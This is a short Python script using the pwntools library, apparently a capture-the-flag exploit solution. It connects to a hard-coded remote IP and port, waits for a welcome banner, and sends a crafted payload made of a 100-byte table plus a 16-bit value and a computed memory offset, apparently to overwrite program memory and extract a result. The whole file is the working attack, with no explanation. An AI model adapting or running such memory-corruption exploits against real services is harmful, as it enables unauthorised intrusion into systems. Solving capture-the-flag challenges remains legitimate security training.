from pwn import *

context.log_level = 'error'

HOST, PORT = '111.186.59.32', 20217
# HOST, PORT = '0.0.0.0', 31338
r = remote(HOST, PORT)

memory = [
    8, 4, 3, 7, 9, 1, 10, 2, 5, 6,  # 2-
    2, 3, 8, 9, 4, 7, 6, 1, 10, 5,  # 2-
    5, 10, 4, 6, 3, 9, 1, 7, 2, 8,  # 2
    9, 6, 2, 10, 5, 4, 3, 8, 7, 1,  # 2
    7, 2, 1, 4, 10, 3, 8, 5, 6, 9,  # 2
    3, 8, 6, 5, 7, 2, 9, 10, 1, 4,  # 2-
    10, 5, 7, 2, 1, 8, 4, 6, 9, 3,  # 3-
    4, 9, 10, 1, 6, 5, 7, 3, 8, 2,  # 3
    1, 7, 5, 3, 8, 6, 2, 9, 4, 10,  # 1-
    6, 1, 9, 8, 2, 10, 5, 4, 3, 7,  # 3
]

offset = 0x80c0 - 0x4020 + 0x4000 - 0xa0+8
value = 0xcc8
r.recvuntil('Welcome')
r.send(bytes(memory) + p16(value) + p16(offset))
print('packet:' + r.recvall().decode().replace('\n', ' '))
